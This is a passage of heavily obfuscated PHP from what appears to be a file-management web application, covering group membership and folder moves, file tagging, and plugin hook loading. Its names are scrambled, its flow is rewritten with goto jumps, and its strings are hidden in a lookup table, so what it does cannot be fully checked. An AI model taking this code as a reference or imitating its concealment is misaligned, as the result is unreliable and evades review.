intval($CˆÁ©Ù¢§Œ[$cÙ¨ğÚç’ª]) : !1; } unset($eÖÆÎ›­‰¾); goto C›©³–÷‹ï; cŞÁ¼Óğˆø: $f¤óÇ•šÍÎ = array($a§œÒ—ĞÊ[472], $a§œÒ—ĞÊ[1744] => $a§œÒ—ĞÊ[474]); $AÁ±Ã ­ = $this->field($f¤óÇ•šÍÎ)->where($E¥ßÀ„É¶)->group($a§œÒ—ĞÊ[472])->select(); $CˆÁ©Ù¢§Œ = array_to_keyvalue($AÁ±Ã ­, $a§œÒ—ĞÊ[472], $a§œÒ—ĞÊ[474]); goto aÔç–´ªÓ; C›©³–÷‹ï: } private function _listAppendChildrenMember(&$a²÷¡‘‰Û§) { goto d´Ç¡»ŸêŒ; F”¸›Öˆ¢: $fÁÊ¾‘¦™ = array($Aç“¤å±·±[1654], $Aç“¤å±·±[1744] => $Aç“¤å±·±[474]); $aÏ«áÛ’¹Ç = Model($Aç“¤å±·±[1736])->field($fÁÊ¾‘¦™)->where($e†î”œù­Ä)->group($Aç“¤å±·±[1654])->select(); $E×éÊ¸ºã³ = array_to_keyvalue($aÏ«áÛ’¹Ç, $Aç“¤å±·±[1654], $Aç“¤å±·±[474]); goto Añ­‹éñ½Å; d´Ç¡»ŸêŒ: $Aç“¤å±·± =& $_SERVER[ç]; $eË¢£Ú•íË = array_to_keyvalue($a²÷¡‘‰Û§, $Aç“¤å±·±[33], $Aç“¤å±·±[1654]); $e†î”œù­Ä = array($Aç“¤å±·±[1654] => array($Aç“¤å±·±[7], $eË¢£Ú•íË)); goto F”¸›Öˆ¢; Añ­‹éñ½Å: foreach ($a²÷¡‘‰Û§ as &$E‹“¸Öõæñ) { $AÁØÚ„Äœ = $E‹“¸Öõæñ[$Aç“¤å±·±[1654]]; $E‹“¸Öõæñ[$Aç“¤å±·±[1746]] = isset($E×éÊ¸ºã³[$AÁØÚ„Äœ]) ? intval($E×éÊ¸ºã³[$AÁØÚ„Äœ]) : !1; } unset($E‹“¸Öõæñ); goto B¬Šæà‹‰ç; B¬Šæà‹‰ç: } private function _listAppendMeta(&$A¼¼â”ù, $CÛØ†’ÕÁô) { goto d†ÀËğ„Ù; e«¬ì‹Õ¹: foreach ($A¼¼â”ù as &$c¦Úƒ§ÇÅÅ) { $c¦Úƒ§ÇÅÅ[$bÈ•¶çß²[439]] = array(); if (isset($eç‚õòÂÖÉ[$c¦Úƒ§ÇÅÅ[$bÈ•¶çß²[1654]]])) { $c¦Úƒ§ÇÅÅ[$bÈ•¶çß²[439]] = $eç‚õòÂÖÉ[$c¦Úƒ§ÇÅÅ[$bÈ•¶çß²[1654]]]; } } unset($c¦Úƒ§ÇÅÅ); goto f·…¦¤¯®‚; d†ÀËğ„Ù: $bÈ•¶çß² =& $_SERVER[ç]; $eöĞÉ‰Şº = array($bÈ•¶çß²[1654] => array($bÈ•¶çß²[7], $CÛØ†’ÕÁô)); $eç‚õòÂÖÉ = Model($bÈ•¶çß²[1735])->where($eöĞÉ‰Şº)->select(); goto E¹É§ğ§ğø; E¹É§ğ§ğø: $eç‚õòÂÖÉ = array_to_keyvalue_group($eç‚õòÂÖÉ, $bÈ•¶çß²[1654]); foreach ($eç‚õòÂÖÉ as &$BÑˆÎ‡å) { $BÑˆÎ‡å = array_to_keyvalue($BÑˆÎ‡å, $bÈ•¶çß²[92], $bÈ•¶çß²[370]); } unset($BÑˆÎ‡å); goto e«¬ì‹Õ¹; f·…¦¤¯®‚: } protected function parentLevelArray($B‚‰Ù¸¬šİ) { $Bˆ¾¥™ôà =& $_SERVER[ç]; $B‚‰Ù¸¬šİ = explode($Bˆ¾¥™ôà[47], trim($B‚‰Ù¸¬šİ, $Bˆ¾¥™ôà[47])); $B‚‰Ù¸¬šİ = array_remove_value($B‚‰Ù¸¬šİ, $Bˆ¾¥™ôà[491]); return $B‚‰Ù¸¬šİ; } private function _listAppendParent(&$cÌ³Úƒ¬­Ê) { goto DĞœ¾“ËÄ; CŞ¼ĞÚ‰½Š: foreach ($cÌ³Úƒ¬­Ê as &$då‡¿†î¨’) { $d–ØÅ§ÈçÂ = $this->parentLevelArray($då‡¿†î¨’[$BÃÒ¥ĞÂù[481]]); $Bœ½£œÔ™¼ = $BÃÒ¥ĞÂù[33]; foreach ($d–ØÅ§ÈçÂ as $FÑÆ‹óÍ‚Ë => $Eó§ìµ¦à) { if ($bÊ”áã§ && $FÑÆ‹óÍ‚Ë == 0) { continue; } $Bœ½£œÔ™¼ .= $CªĞŠÀÊíŒ[$Eó§ìµ¦à] . $BÃÒ¥ĞÂù[8]; } if ($d–ØÅ§ÈçÂ) { $Bœ½£œÔ™¼ .= $då‡¿†î¨’[$BÃÒ¥ĞÂù[28]]; } $då‡¿†î¨’[$BÃÒ¥ĞÂù[485]] = str_replace($BÃÒ¥ĞÂù[490], $BÃÒ¥ĞÂù[8], $Bœ½£œÔ™¼); } unset($då‡¿†î¨’); goto fëµê…É¬; DĞœ¾“ËÄ: $BÃÒ¥ĞÂù =& $_SERVER[ç]; $CªĞŠÀÊíŒ = array(); foreach ($cÌ³Úƒ¬­Ê as &$då‡¿†î¨’) { $CªĞŠÀÊíŒ[$då‡¿†î¨’[$BÃÒ¥ĞÂù[1654]]] = $då‡¿†î¨’[$BÃÒ¥ĞÂù[28]]; $d–ØÅ§ÈçÂ = $this->parentLevelArray($då‡¿†î¨’[$BÃÒ¥ĞÂù[481]]); foreach ($d–ØÅ§ÈçÂ as $Eó§ìµ¦à) { if (!isset($CªĞŠÀÊíŒ[$Eó§ìµ¦à])) { $CªĞŠÀÊíŒ[$Eó§ìµ¦à] = 0; } } } goto A¥²ÀèÜË—; A¥²ÀèÜË—: unset($då‡¿†î¨’); foreach ($CªĞŠÀÊíŒ as $FÑÆ‹óÍ‚Ë => $AÌãºŒ§†¼) { if ($AÌãºŒ§†¼) { continue; } $fğ™çÅĞõ‡ = $this->getInfoSimple($FÑÆ‹óÍ‚Ë); $CªĞŠÀÊíŒ[$FÑÆ‹óÍ‚Ë] = $fğ™çÅĞõ‡[$BÃÒ¥ĞÂù[28]]; } $bÊ”áã§ = $GLOBALS[$BÃÒ¥ĞÂù[6]][$BÃÒ¥ĞÂù[87]][$BÃÒ¥ĞÂù[1747]]; goto CŞ¼ĞÚ‰½Š; fëµê…É¬: } private function _listAppendSourceRoot(&$eÄ¦­‹¼Ú, $a¢ªÄ•àÔÈ) { goto eêù±ÈÛ·ª; eêù±ÈÛ·ª: $f¤ÖÃè¼‚½ =& $_SERVER[ç]; $C¾Óô„È = array($f¤ÖÃè¼‚½[398] => SourceModel::TYPE_GROUP, $f¤ÖÃè¼‚½[472] => 0, $f¤ÖÃè¼‚½[478] => array($f¤ÖÃè¼‚½[7], $a¢ªÄ•àÔÈ)); $FèùÚ˜„»Î = $f¤ÖÃè¼‚½[1748]; goto aç­Ş°ƒ¦Ø; aç­Ş°ƒ¦Ø: $B´¶åè–¬‡ = Model($f¤ÖÃè¼‚½[760])->order($f¤ÖÃè¼‚½[1749])->field($FèùÚ˜„»Î)->where($C¾Óô„È)->select(); $B´¶åè–¬‡ = array_to_keyvalue($B´¶åè–¬‡, $f¤ÖÃè¼‚½[478]); $B´¶åè–¬‡ = array_remove_key($B´¶åè–¬‡, $f¤ÖÃè¼‚½[478]); goto aá¥Ä­œ¡ƒ; aá¥Ä­œ¡ƒ: foreach ($eÄ¦­‹¼Ú as &$AƒÑ°’¸…) { $AƒÑ°’¸…[$f¤ÖÃè¼‚½[84]] = $B´¶åè–¬‡[$AƒÑ°’¸…[$f¤ÖÃè¼‚½[1654]]] ? $B´¶åè–¬‡[$AƒÑ°’¸…[$f¤ÖÃè¼‚½[1654]]] : array(); } unset($AƒÑ°’¸…); goto dø ÔİêŞµ; dø ÔİêŞµ: } protected function groupMerge($d¯²ŸäÕãâ) { $d¯²ŸäÕãâ = array_values(array_unique($d¯²ŸäÕãâ)); $DÕö£¶…İ = array(); for ($aî…˜î‡¸ = 0; $aî…˜î‡¸ < count($d¯²ŸäÕãâ); $aî…˜î‡¸++) { $b˜ÙÌ†×¸İ = !1; for ($Däæ£‹àÁ” = 0; $Däæ£‹àÁ” < count($d¯²ŸäÕãâ); $Däæ£‹àÁ”++) { if ($aî…˜î‡¸ == $Däæ£‹àÁ”) { continue; } if ($this->isParentOf($d¯²ŸäÕãâ[$Däæ£‹àÁ”], $d¯²ŸäÕãâ[$aî…˜î‡¸])) { $b˜ÙÌ†×¸İ = !0; break; } } if (!$b˜ÙÌ†×¸İ) { $DÕö£¶…İ[] = $d¯²ŸäÕãâ[$aî…˜î‡¸]; } } return $DÕö£¶…İ; } protected function isParentOf($cäå÷ğ›‚, $dÜœÆ­óé½) { goto a¡‘ŸÕÜİ•; C³’œÛ¦ïÉ: $dãäíóÈ‘› = $this->getInfoSimple($dÜœÆ­óé½); $Fí›îêÂ†® = $FÑÙÉ‚´íŞ[$bØì‡¨ƒÒ[481]] . $cäå÷ğ›‚ . $bØì‡¨ƒÒ[47]; if (substr($dãäíóÈ‘›[$bØì‡¨ƒÒ[481]], 0, strlen($Fí›îêÂ†®)) == $Fí›îêÂ†®) { return !0; } goto c³ë–¾–ô; a¡‘ŸÕÜİ•: $bØì‡¨ƒÒ =& $_SERVER[ç]; if (!$cäå÷ğ›‚ || !$dÜœÆ­óé½ || $cäå÷ğ›‚ == $dÜœÆ­óé½) { return !1; } $FÑÙÉ‚´íŞ = $this->getInfoSimple($cäå÷ğ›‚); goto C³’œÛ¦ïÉ; c³ë–¾–ô: return !1; goto b…•–…óó; b…•–…óó: } public function groupShowRoot($A¡†¼Ê, $b‘¡‹ãßé = false) { goto CêË…˜Ùâ; CêË…˜Ùâ: $FÑ°°õó¤ =& $_SERVER[ç]; $C¡®šµªöê = $this->getInfo($A¡†¼Ê); if (!$C¡®šµªöê) { return array(); } goto CùÀöéÕ™‹; dŠà½‰³Á°: return $e£åØŒ¶ì­; goto eéáÉ«ë‹²; dâÔ±Äõ—œ: if ($b‘¡‹ãßé && count($fÊÀÅ³Ì…Ö) == 1) { return $e£åØŒ¶ì­; } if (!$C¡®šµªöê[$FÑ°°õó¤[439]] || !isset($C¡®šµªöê[$FÑ°°õó¤[439]][$FÑ°°õó¤[1731]]) || $C¡®šµªöê[$FÑ°°õó¤[439]][$FÑ°°õó¤[1731]] == $FÑ°°õó¤[1705]) { return $this->groupShowRoot($fÊÀÅ³Ì…Ö[count($fÊÀÅ³Ì…Ö) - 1], $b‘¡‹ãßé); } if ($C¡®šµªöê[$FÑ°°õó¤[439]][$FÑ°°õó¤[1731]] == $FÑ°°õó¤[355]) { $bæØŠù¢â‰ = explode($FÑ°°õó¤[47], $C¡®šµªöê[$FÑ°°õó¤[439]][$FÑ°°õó¤[1732]]); if ($bæØŠù¢â‰) { $e£åØŒ¶ì­ = array_merge($e£åØŒ¶ì­, $bæØŠù¢â‰); } } goto dŠà½‰³Á°; CùÀöéÕ™‹: $fÊÀÅ³Ì…Ö = $this->parentLevelArray($C¡®šµªöê[$FÑ°°õó¤[481]]); $e£åØŒ¶ì­ = array($A¡†¼Ê); if (count($fÊÀÅ³Ì…Ö) == 0) { return $e£åØŒ¶ì­; } goto dâÔ±Äõ—œ; eéáÉ«ë‹²: } protected function resetParentLevel() { $E…î¬´„²¬ =& $_SERVER[ç]; $cééË–¬ßÒ = $E…î¬´„²¬[1654]; $Fƒµˆ±İÎ = $this->select(); $Fƒµˆ±İÎ = array_to_keyvalue($Fƒµˆ±İÎ, $cééË–¬ßÒ); foreach ($Fƒµˆ±İÎ as $EùºÙÓàˆÜ) { goto b¶¥‡Ùšµ; B§‚ÕÔ¢í®: $this->where(array($cééË–¬ßÒ => $EùºÙÓàˆÜ[$cééË–¬ßÒ]))->save(array($E…î¬´„²¬[548] => $b‰¦òÒĞìœ)); goto CŞ÷åªÒêŸ; aÂ†³âóÈ: $b‰¦òÒĞìœ[] = 0; $b‰¦òÒĞìœ = $E…î¬´„²¬[47] . implode($E…î¬´„²¬[47], array_reverse($b‰¦òÒĞìœ)) . $E…î¬´„²¬[47]; $this->setNamePinyin($EùºÙÓàˆÜ[$cééË–¬ßÒ], $EùºÙÓàˆÜ[$E…î¬´„²¬[28]]); goto B§‚ÕÔ¢í®; b¶¥‡Ùšµ: $eÈğÜĞ®× = $EùºÙÓàˆÜ; $b‰¦òÒĞìœ = array(); while ($eÈğÜĞ®×[$E…î¬´„²¬[472]] != 0) { $b‰¦òÒĞìœ[] = $eÈğÜĞ®×[$E…î¬´„²¬[472]]; $eÈğÜĞ®× = $Fƒµˆ±İÎ[$eÈğÜĞ®×[$E…î¬´„²¬[472]]]; } goto aÂ†³âóÈ; CŞ÷åªÒêŸ: } return $Fƒµˆ±İÎ; } public function groupNameAuto($AŒ¿ˆ´ÄöÕ, $d¬è¦ƒõ¸) { $a±‚õïäé÷ =& $_SERVER[ç]; $få¦¨Í­ä¬ = $this->where(array($a±‚õïäé÷[389] => $AŒ¿ˆ´ÄöÕ))->getField($a±‚õïäé÷[28], !0); if (!$få¦¨Í­ä¬ || !in_array($d¬è¦ƒõ¸, $få¦¨Í­ä¬)) { return $d¬è¦ƒõ¸; } for ($bœÉ•İ‘õ = 1; $bœÉ•İ‘õ <= count($få¦¨Í­ä¬) + 1; $bœÉ•İ‘õ++) { $f¬ÚÑ†‰‹  = $d¬è¦ƒõ¸ . "\50{$bœÉ•İ‘õ}\51"; if (!in_array($f¬ÚÑ†‰‹ , $få¦¨Í­ä¬)) { return $f¬ÚÑ†‰‹ ; } } } public function groupSwitch($CíÌà Ğé£, $A»ç±„ÓÃ) { goto EÖ¤¸Ã¨Ø; CÚêÅÅêÒá: $aô‰”à»¬Ñ = array_to_keyvalue($aô‰”à»¬Ñ, $b»±ªõ¼ğß[1654]); if (!isset($aô‰”à»¬Ñ[$CíÌà Ğé£]) || !isset($aô‰”à»¬Ñ[$A»ç±„ÓÃ]) || $aô‰”à»¬Ñ[$CíÌà Ğé£][$b»±ªõ¼ğß[472]] == 0) { return !1; } $b¬¢ö¦®î¥ = array($b»±ªõ¼ğß[1654] => $CíÌà Ğé£); goto a•±¹õ‚Ö; CÍ±¯›®Ç: $this->where(array($b»±ªõ¼ğß[472] => $CíÌà Ğé£))->save(array($b»±ªõ¼ğß[472] => $A»ç±„ÓÃ)); return !0; goto c–¡´§¶»; FÇÓÈ¡Ü©—: $b¬¢ö¦®î¥ = array($b»±ªõ¼ğß[398] => 2, $b»±ªõ¼ğß[472] => 0, $b»±ªõ¼ğß[397] => 1, $b»±ªõ¼ğß[478] => array($b»±ªõ¼ğß[7], array($CíÌà Ğé£, $A»ç±„ÓÃ))); $Bğƒï¦¨Æ = Model($b»±ªõ¼ğß[760])->where($b¬¢ö¦®î¥)->field($b»±ªõ¼ğß[1751])->select(); $Bğƒï¦¨Æ = array_to_keyvalue($Bğƒï¦¨Æ, $b»±ªõ¼ğß[478], $b»±ªõ¼ğß[390]); goto E¹­ÌÑ—ŠÎ; EÖ¤¸Ã¨Ø: $b»±ªõ¼ğß =& $_SERVER[ç]; $b¬¢ö¦®î¥ = array($b»±ªõ¼ğß[1654] => array($b»±ªõ¼ğß[7], array($CíÌà Ğé£, $A»ç±„ÓÃ))); $aô‰”à»¬Ñ = $this->where($b¬¢ö¦®î¥)->select(); goto CÚêÅÅêÒá; a•±¹õ‚Ö: $fÛîƒ˜ÔÁŞ = Model($b»±ªõ¼ğß[1736])->where($b¬¢ö¦®î¥)->select(); if (!$fÛîƒ˜ÔÁŞ) { $fÛîƒ˜ÔÁŞ = array(); } foreach ($fÛîƒ˜ÔÁŞ as $A•è‘ìŒ§æ) { $D…¢ÒšÆùÇ = $A•è‘ìŒ§æ[$b»±ªõ¼ğß[1491]]; $b¬¢ö¦®î¥ = array($b»±ªõ¼ğß[1491] => $D…¢ÒšÆùÇ, $b»±ªõ¼ğß[1654] => $A»ç±„ÓÃ); $cØæÒƒ¼Ÿ¢ = Model($b»±ªõ¼ğß[1736])->where($b¬¢ö¦®î¥)->find(); if (!$cØæÒƒ¼Ÿ¢) { $d°Â‹µÀİ = array($A»ç±„ÓÃ => $A•è‘ìŒ§æ[$b»±ªõ¼ğß[1750]]); Model($b»±ªõ¼ğß[501])->userGroupAdd($D…¢ÒšÆùÇ, $d°Â‹µÀİ); } Model($b»±ªõ¼ğß[501])->userGroupRemove($D…¢ÒšÆùÇ, $CíÌà Ğé£); } goto FÇÓÈ¡Ü©—; E¹­ÌÑ—ŠÎ: $bÜ÷îğç‹Â = !empty($Bğƒï¦¨Æ[$CíÌà Ğé£]) ? $Bğƒï¦¨Æ[$CíÌà Ğé£] : !1; if ($bÜ÷îğç‹Â) { goto EÆëÀïç‰; bç„‰øÅ¯: foreach ($Bğƒï¦¨Æ as $D—›ğ”µª) { $AæÒ®ƒ¶éÌ = $D—›ğ”µª[$b»±ªõ¼ğß[397]] == $b»±ªõ¼ğß[86] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($b»±ªõ¼ğß[760])->move($D—›ğ”µª[$b»±ªõ¼ğß[390]], $c˜Ö«Û‰ÃÍ, $AæÒ®ƒ¶éÌ); } Model($b»±ªõ¼ğß[760])->moveClearAuth = !0; $b¬¢ö¦®î¥ = array($b»±ªõ¼ğß[398] => 2, $b»±ªõ¼ğß[478] => $CíÌà Ğé£); goto C Ä‹Ì‚‘; Cİ®»ºïà›: $Bğƒï¦¨Æ = Model($b»±ªõ¼ğß[760])->where($b¬¢ö¦®î¥)->field($b»±ªõ¼ğß[1752])->select(); if (!$Bğƒï¦¨Æ) { $Bğƒï¦¨Æ = array(); } Model($b»±ªõ¼ğß[760])->moveClearAuth = !1; goto bç„‰øÅ¯; C Ä‹Ì‚‘: $DŒ®ÜØÀ¯ = array($b»±ªõ¼ğß[478] => $A»ç±„ÓÃ); Model($b»±ªõ¼ğß[1753])->where($b¬¢ö¦®î¥)->save($DŒ®ÜØÀ¯); Model($b»±ªõ¼ğß[1754])->where($b¬¢ö¦®î¥)->save($DŒ®ÜØÀ¯); goto eÁÒÙŞ•ß; EÆëÀïç‰: if (!$Bğƒï¦¨Æ[$A»ç±„ÓÃ]) { $Bğƒï¦¨Æ[$A»ç±„ÓÃ] = Model($b»±ªõ¼ğß[760])->groupRootAdd($A»ç±„ÓÃ); } $c˜Ö«Û‰ÃÍ = $Bğƒï¦¨Æ[$A»ç±„ÓÃ]; $b¬¢ö¦®î¥ = array($b»±ªõ¼ğß[472] => $bÜ÷îğç‹Â); goto Cİ®»ºïà›; eÁÒÙŞ•ß: } $this->_changeChildLevel($aô‰”à»¬Ñ[$CíÌà Ğé£], $aô‰”à»¬Ñ[$A»ç±„ÓÃ], !0); goto CÍ±¯›®Ç; c–¡´§¶»: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\141\166"; protected function cacheFunctionAlias($eªÅœå’Í) { $f¾Õ´†½îç =& $_SERVER[ç]; return array($f¾Õ´†½îç[1755] => array($eªÅœå’Í[0], $f¾Õ´†½îç[1756]), $f¾Õ´†½îç[1757] => array($eªÅœå’Í[0], $f¾Õ´†½îç[1758])); } protected function get($b”õ°õ‘ ©) { $eôÏ†ˆƒĞ =& $_SERVER[ç]; $B£ØƒŒÌ„” = Model($eôÏ†ˆƒĞ[480])->metaGet($b”õ°õ‘ ©, $eôÏ†ˆƒĞ[1759]); $Cİ‡²‡ßæ = json_decode($B£ØƒŒÌ„”, !0); return $Cİ‡²‡ßæ ? $Cİ‡²‡ßæ : array($eôÏ†ˆƒĞ[1760] => $eôÏ†ˆƒĞ[86], $eôÏ†ˆƒĞ[365] => array()); } protected function set($FĞ†Ã´”š, $b–Ë÷¤Ãë) { $e…ï¯éâ´Œ =& $_SERVER[ç]; $b–Ë÷¤Ãë = $b–Ë÷¤Ãë ? $b–Ë÷¤Ãë : array($e…ï¯éâ´Œ[1760] => $e…ï¯éâ´Œ[86], $e…ï¯éâ´Œ[365] => array()); Model($e…ï¯éâ´Œ[480])->metaSet($FĞ†Ã´”š, $e…ï¯éâ´Œ[1759], json_encode($b–Ë÷¤Ãë)); return Model($e…ï¯éâ´Œ[480])->metaSet($FĞ†Ã´”š, $e…ï¯éâ´Œ[1759], json_encode($b–Ë÷¤Ãë)); } protected function getByTagID($f¨„ãÊË¬«, $f¤ø«ôó¾) { goto AÜÌªÎê«à; cïïŒ¥Ëéç: return is_array($B–‰›ğ†Æ) ? $B–‰›ğ†Æ : !1; goto a„Í¨·Ù’; FØ÷„ä¬Ò±: $EŞÃœåãè = $this->get($f¨„ãÊË¬«); if (!$EŞÃœåãè || !isset($EŞÃœåãè[$E£§—öšÑ[365]])) { return !1; } $B–‰›ğ†Æ = array_find_by_field($EŞÃœåãè[$E£§—öšÑ[365]], $E£§—öšÑ[388], $f¤ø«ôó¾); goto cïïŒ¥Ëéç; AÜÌªÎê«à: $E£§—öšÑ =& $_SERVER[ç]; if (!$f¨„ãÊË¬« || !$f¤ø«ôó¾) { return !1; } if (!Model($E£§—öšÑ[480])->getInfoSimple($f¨„ãÊË¬«)) { return !1; } goto FØ÷„ä¬Ò±; a„Í¨·Ù’: } public function listSource($a²÷öàƒŞ, $fÙÕÂãºî) { goto b„Å Å„¹; C ®Û¿§¨à: if (!$d…Ï‰ô¨³Š || count($e›¼©–å¦) == $d…Ï‰ô¨³Š[$c×É³­½—[362]][$c×É³­½—[363]]) { return $d…Ï‰ô¨³Š; } $d²Á£Ã—…‚ = array(); $FÍ…Ìğ½…  = array_to_keyvalue($d…Ï‰ô¨³Š[$c×É³­½—[74]], $c×É³­½—[33], $c×É³­½—[390]); goto A‹¨œï—ˆ ; A‹¨œï—ˆ : $F¦¹µùê‰ = array_to_keyvalue($d…Ï‰ô¨³Š[$c×É³­½—[73]], $c×É³­½—[33], $c×É³­½—[390]); $eàÆÏ˜ˆ = array_merge($F¦¹µùê‰, $FÍ…Ìğ½… ); foreach ($e›¼©–å¦ as $f•“æ¼àö) { if (!in_array($f•“æ¼àö, $eàÆÏ˜ˆ)) { $d²Á£Ã—…‚[] = $f•“æ¼àö; } } goto Bç‰ßõŸ; E®å¥›‹‰È: foreach ($dæƒÄö¢¸Ô as $F¿½Ñ¨Æ½“ => $Béé²’‹¥) { $E¥îÓ¥çòí = !0; if (!$fÙÕÂãºî) { $e›¼©–å¦[] = $F¿½Ñ¨Æ½“; continue; } foreach ($fÙÕÂãºî as $CÒ‡Œ”Í¯ó) { if (!in_array($CÒ‡Œ”Í¯ó, $Béé²’‹¥)) { $E¥îÓ¥çòí = !1; break; } } if ($E¥îÓ¥çòí) { $e›¼©–å¦[] = $F¿½Ñ¨Æ½“; } } if (!$e›¼©–å¦) { return array(); } $d…Ï‰ô¨³Š = Model($c×É³­½—[1171])->listSource(array($c×É³­½—[404] => array($c×É³­½—[405], $e›¼©–å¦))); goto C ®Û¿§¨à; Bç‰ßõŸ: if ($d²Á£Ã—…‚) { $this->removeBySource($a²÷öàƒŞ, $d²Á£Ã—…‚); } return $d…Ï‰ô¨³Š; goto C¬î°õÉÒ­; bïñ¸æÑ„¦: $dæƒÄö¢¸Ô = array(); foreach ($d“È¹…Äâß as $aæšæá“¥) { $f•“æ¼àö = $aæšæá“¥[$c×É³­½—[75]]; if (!$f•“æ¼àö) { continue; } if (!isset($dæƒÄö¢¸Ô[$f•“æ¼àö])) { $dæƒÄö¢¸Ô[$f•“æ¼àö] = array(); } $dæƒÄö¢¸Ô[$f•“æ¼àö][] = $aæšæá“¥[$c×É³­½—[413]]; } $e›¼©–å¦ = array(); goto E®å¥›‹‰È; b„Å Å„¹: $c×É³­½— =& $_SERVER[ç]; if ($fÙÕÂãºî && !is_array($fÙÕÂãºî)) { $fÙÕÂãºî = array($fÙÕÂãºî); } $d“È¹…Äâß = $this->listData($a²÷öàƒŞ); goto bïñ¸æÑ„¦; C¬î°õÉÒ­: } protected function listData($Dà¹Â©ëß) { $a¡…ã…¼¾¶ =& $_SERVER[ç]; $b™è¯ë× = array($a¡…ã…¼¾¶[1483] => 0, $a¡…ã…¼¾¶[457] => array($a¡…ã…¼¾¶[1761], 0), $a¡…ã…¼¾¶[409] => $a¡…ã…¼¾¶[1762] . $Dà¹Â©ëß); $CÔõøØëê = $a¡…ã…¼¾¶[1763]; $FÏøòîŸ = $this->field($CÔõøØëê)->where($b™è¯ë×)->order($a¡…ã…¼¾¶[1764])->select(); return $FÏøòîŸ ? $FÏøòîŸ : array(); } protected function addToTag($C´‡©ÑÎ, $dàïŞ©‡œÓ, $C×†ĞÈÓƒª) { $E†‹¤¦ñ©Ä =& $_SERVER[ç]; if (!$this->getByTagID($C´‡©ÑÎ, $C×†ĞÈÓƒª) || !$dàïŞ©‡œÓ) { return !1; } if (!Model($E†‹¤¦ñ©Ä[760])->pathInfo($dàïŞ©‡œÓ)) { return !1; } $AµØÕ‹‘‹ = array($E†‹¤¦ñ©Ä[1483] => 0, $E†‹¤¦ñ©Ä[457] => $C×†ĞÈÓƒª, $E†‹¤¦ñ©Ä[408] => $dàïŞ©‡œÓ, $E†‹¤¦ñ©Ä[409] => $E†‹¤¦ñ©Ä[1765] . $C´‡©ÑÎ, $E†‹¤¦ñ©Ä[407] => $E†‹¤¦ñ©Ä[33], $E†‹¤¦ñ©Ä[1658] => 0); if ($this->where($AµØÕ‹‘‹)->find()) { return !1; } return $this->add($AµØÕ‹‘‹); } protected function removeFromTag($DÂ©»Ï‹¥æ, $c§ß™¬å»Â, $Bù†ÁÎ¡Öó) { $eÎ•Œğî  =& $_SERVER[ç]; if (!$this->getByTagID($DÂ©»Ï‹¥æ, $Bù†ÁÎ¡Öó) || !$c§ß™¬å»Â) { return !1; } if (is_array($c§ß™¬å»Â)) { $c§ß™¬å»Â = array($eÎ•Œğî [7], $c§ß™¬å»Â); } $E—çÏğÏÁ¥ = array($eÎ•Œğî [1483] => 0, $eÎ•Œğî [457] => $Bù†ÁÎ¡Öó, $eÎ•Œğî [409] => $eÎ•Œğî [1765] . $DÂ©»Ï‹¥æ, $eÎ•Œğî [408] => $c§ß™¬å»Â); return $this->where($E—çÏğÏÁ¥)->delete(); } protected function removeByTag($E’×‘°§í·, $F·Óø«¬¬) { $aĞÕÁèÃàœ =& $_SERVER[ç]; if (!$this->getByTagID($E’×‘°§í·, $F·Óø«¬¬)) { return !1; } $a¼’‘ª›”Õ = array($aĞÕÁèÃàœ[1483] => 0, $aĞÕÁèÃàœ[457] => $F·Óø«¬¬, $aĞÕÁèÃàœ[409] => $aĞÕÁèÃàœ[1765] . $E’×‘°§í·); return $this->where($a¼’‘ª›”Õ)->delete(); } protected function removeBySource($AÂĞŞÔ™÷’, $C¡ŠÜâ‹¼) { $Aæ›Üà•ö® =& $_SERVER[ç]; if (!$AÂĞŞÔ™÷’ || !$C¡ŠÜâ‹¼) { return !1; } if (is_array($C¡ŠÜâ‹¼)) { $C¡ŠÜâ‹¼ = array($Aæ›Üà•ö®[7], $C¡ŠÜâ‹¼); } $eÉÒø‰ëóİ = array($Aæ›Üà•ö®[1483] => 0, $Aæ›Üà•ö®[408] => $C¡ŠÜâ‹¼, $Aæ›Üà•ö®[457] => array($Aæ›Üà•ö®[939], 0), $Aæ›Üà•ö®[409] => $Aæ›Üà•ö®[1765] . $AÂĞŞÔ™÷’); return $this->where($eÉÒø‰ëóİ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x70\154\165\x67\x69\x6e\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x73\164\x61\x74\165\163", "\x72\145\x67\x69\x65\x73\x74", "\x63\x6f\x6e\146\151\147"); public function loadList($c¯ö‰œ‘†« = false) { $A˜è‚˜î = array_to_keyvalue($this->listData(), $_SERVER[ç][28]); if ($c¯ö‰œ‘†«) { return $A˜è‚˜î[$c¯ö‰œ‘†«]; } return $A˜è‚˜î; } public function init() { $Aİ•ó­êö =& $_SERVER[ç]; Hook::trigger($Aİ•ó­êö[1766]); $DîŠ¶‘ô«º = $this->loadPluginList(); foreach ($DîŠ¶‘ô«º as $cÖ§ğ©Ç¡â => $eâ’ºìÅù…) { $BÅøê†°ˆ = $this->appAllow($cÖ§ğ©Ç¡â, $eâ’ºìÅù…); if (!$BÅøê†°ˆ) { continue; } foreach ($eâ’ºìÅù…[$Aİ•ó­êö[1767]] as $B±×†æ¸·× => $FƒÑ‘¼âÀ) { Hook::bind($B±×†æ¸·×, $FƒÑ‘¼âÀ); } } Hook::trigger($Aİ•ó­êö[1768]); Hook::trigger(ACTION); } public function appAllow($d¬¸±¾É­, $aÆÆ•‚´‡, $f´¨ËÎ×¯ = true) { $eöôè£õßè =& $_SERVER[ç]; $d¨ñ‡µîÔ© = PLUGIN_DIR . $d¬¸±¾É­ . $eöôè£õßè[1769]; if (!is_array($aÆÆ•‚´‡) || !is_array($aÆÆ•‚´‡[$eöôè£õßè[1767]]) || $aÆÆ•‚´‡[$eöôè£õßè[695]] != 1 || !is_file($d¨ñ‡µîÔ©)) { return !1; } if ($GLOBALS[$eöôè£õßè[479]] == 1) { return !0; } if ($f´¨ËÎ×¯ && !Action($eöôè£õßè[1770])->checkAuth($d¬¸±¾É­)) { return !1; } return !0; } public function unInstall($D·²Ï½Ø¬“) { $E¡ëÖíêÕ¡ =& $_SERVER[ç]; $C×“ºÛ°· = $this->loadList($D·²Ï½Ø¬“); if (file_exists(PLUGIN_DIR . $D·²Ï½Ø¬“)) { Hook::apply($D·²Ï½Ø¬“ . $E¡ëÖíêÕ¡[1771]); } $this->remove($C×“ºÛ°·[$E¡ëÖíêÕ¡[388]]); } public function changeStatus($AßŒ ½ğÃ, $aŞì…Î•ƒ×) { $bá†ºç™¶’ =& $_SERVER[ç]; 